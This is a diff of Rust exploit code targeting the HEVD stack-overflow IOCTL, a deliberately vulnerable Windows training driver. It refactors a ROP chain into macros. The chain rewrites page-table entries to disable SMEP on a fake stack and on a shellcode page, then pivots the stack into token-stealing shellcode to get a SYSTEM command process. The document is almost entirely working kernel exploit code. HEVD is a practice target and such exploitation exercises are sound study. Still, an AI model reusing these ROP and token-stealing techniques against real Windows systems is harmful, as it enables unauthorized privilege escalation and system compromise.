@@ -1,18 +1,18 @@
 use core::ffi::c_void;
 use std::iter;
 
-use win_kexp::rop::find_gadget_offset;
-use win_kexp::shellcode::token_stealing_shellcode_smep_no_kvashadow_pte;
-use win_kexp::util::bytes_to_hex_string;
-use win_kexp::win32k::{allocate_memory, lock_memory, PAGE_EXECUTE_READWRITE};
-use win_kexp::{create_rop_chain, create_rop_chain_to_buffer, CTL_CODE, IOCTL};
 use win_kexp::{
-    rop::get_executable_sections,
+    concat_rop_chain_to_buffer, create_rop_chain,
+    rop::{find_gadget_offset, get_executable_sections},
+    shellcode::token_stealing_shellcode_smep_no_kvashadow_pte,
+    util::bytes_to_hex_string,
     win32k::{
-        allocate_shellcode, close_handle, create_cmd_process, get_device_handle,
-        get_ntoskrnl_base_address, io_device_control, load_library_no_resolve, FILE_ANY_ACCESS,
-        FILE_DEVICE_UNKNOWN, MEM_COMMIT, MEM_RESERVE, METHOD_NEITHER,
+        allocate_memory, allocate_shellcode, close_handle, create_cmd_process, get_device_handle,
+        get_ntoskrnl_base_address, io_device_control, load_library_no_resolve, lock_memory,
+        FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, MEM_COMMIT, MEM_RESERVE, METHOD_NEITHER,
+        PAGE_EXECUTE_READWRITE,
     },
+    CTL_CODE, IOCTL,
 };
 
 const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);
@@ -137,55 +137,87 @@ fn build_smep_disable_rop_chain(
     );
 
     let fake_stack_address = fake_stack.wrapping_add(0x18f1b) as u64;
-
     let fake_stack_slice =
         unsafe { std::slice::from_raw_parts_mut(fake_stack_address as *mut u8, 0x1400) };
 
-    create_rop_chain_to_buffer!(
+    macro_rules! create_rsp_restore_chain {
+        ($stack_offset:expr, $reg_offset:expr) => {
+            create_rop_chain!(
+                0,
+                pop_r8_ret_address,
+                fake_stack_address + $stack_offset * 8,
+                pop_r9_ret_address,
+                $reg_offset,
+                add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
+                mov_deref_r8_rcx_ret_address
+            )
+        };
+    }
+
+    macro_rules! create_r15_restore_chain {
+        ($stack_offset:expr, $reg_offset:expr) => {
+            create_rop_chain!(
+                0,
+                pop_r8_ret_address,
+                fake_stack_address + $stack_offset * 8,
+                pop_r9_ret_address,
+                $reg_offset,
+                add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
+                mov_rcx_qword_rcx_ret_address,
+                mov_deref_r8_rcx_ret_address
+            )
+        };
+    }
+
+    macro_rules! create_get_pte_address_chain {
+        ($pte_address:expr) => {
+            create_rop_chain!(
+                0,
+                pop_rax_ret_address,
+                mi_get_pte_address,
+                pop_rcx_ret_address,
+                $pte_address,
+                push_rax_ret_address,
+                mov_r8_rax_mov_rax_r8_ret_address,
+                mov_rcx_r8_mov_rax_rcx_ret_address,
+                pop_rax_ret_address,
+                0x000000000000004u64,
+                xor_deref_rcx_rax_ret_address,
+            )
+        };
+    }
+
+    macro_rules! create_prologue_chain {
+        ($shellcode_address:expr) => {
+            create_rop_chain!(
+                0,
+                add_rsp_28_ret_address,
+                0x4444444444444444u64,
+                0x4444444444444444u64,
+                0x4444444444444444u64,
+                0x4444444444444444u64,
+                0x4444444444444444u64,
+                $shellcode_address,
+                pop_r15_ret_address,
+                0x4444444444444444u64,
+                pop_rsp_ret_address,
+            )
+        };
+    }
+
+    let restore_rsp_rop_chain = create_rsp_restore_chain!(43, 0x28_u64);
+    let restore_r15_rop_chain = create_r15_restore_chain!(41, 0x88_u64);
+    let disable_fake_stack_smep_chain = create_get_pte_address_chain!(fake_stack_address);
+    let disable_shellcode_smep_chain = create_get_pte_address_chain!(shellcode_address);
+    let prologue_chain = create_prologue_chain!(shellcode_address);
+
+    concat_rop_chain_to_buffer!(
         fake_stack_slice,
-        pop_r8_ret_address,
-        fake_stack_address + 43 * 8,
-        pop_r9_ret_address,
-        0x28_u64,
-        add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
-        mov_deref_r8_rcx_ret_address,
-        pop_r8_ret_address,
-        fake_stack_address + 41 * 8,
-        pop_r9_ret_address,
-        0x88_u64,
-        add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
-        mov_rcx_qword_rcx_ret_address,
-        mov_deref_r8_rcx_ret_address,
-        pop_rcx_ret_address,
-        fake_stack_address,
-        pop_rax_ret_address,
-        mi_get_pte_address,
-        push_rax_ret_address,
-        mov_r8_rax_mov_rax_r8_ret_address,
-        mov_rcx_r8_mov_rax_rcx_ret_address,
-        pop_rax_ret_address,
-        0x000000000000004u64,
-        xor_deref_rcx_rax_ret_address,
-        pop_rcx_ret_address,
-        shellcode_address,
-        pop_rax_ret_address,
-        mi_get_pte_address,
-        push_rax_ret_address,
-        mov_r8_rax_mov_rax_r8_ret_address,
-        mov_rcx_r8_mov_rax_rcx_ret_address,
-        pop_rax_ret_address,
-        0x000000000000004u64,
-        xor_deref_rcx_rax_ret_address,
-        add_rsp_28_ret_address,
-        0x4444444444444444u64,
-        0x4444444444444444u64,
-        0x4444444444444444u64,
-        0x4444444444444444u64,
-        0x4444444444444444u64,
-        shellcode_address,
-        pop_r15_ret_address,
-        0x4444444444444444u64,
-        pop_rsp_ret_address,
+        restore_rsp_rop_chain,
+        restore_r15_rop_chain,
+        disable_fake_stack_smep_chain,
+        disable_shellcode_smep_chain,
+        prologue_chain,
     );
 
     println!("[+] Main rop chain written to fake stack");
